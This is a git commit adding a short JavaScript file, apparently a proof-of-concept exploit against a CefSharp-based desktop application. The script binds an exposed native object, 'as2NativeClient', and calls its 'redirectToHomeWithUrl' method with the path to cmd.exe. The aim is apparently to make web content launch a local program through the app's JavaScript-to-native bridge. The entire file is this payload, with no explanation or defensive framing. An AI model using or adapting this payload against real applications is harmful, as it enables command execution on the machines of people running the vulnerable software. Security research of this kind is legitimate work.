b740be20e22084297ee66633fb3393cdcd5791ac
Rakesh Mane <rakeshmane12345@gmail.com>
2020-07-09 21:02:54 +0530

    Create tmp1.js

---
+++ tmp1.js
@@ -0,0 +1,11 @@
+
+        window.CefSharp.BindObjectAsync("as2NativeClient")
+        .then((result) => {
+          if(window.as2NativeClient) {
+                  
+            
+            window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\cmd.exe");
+             
+                  
+          }
+        })
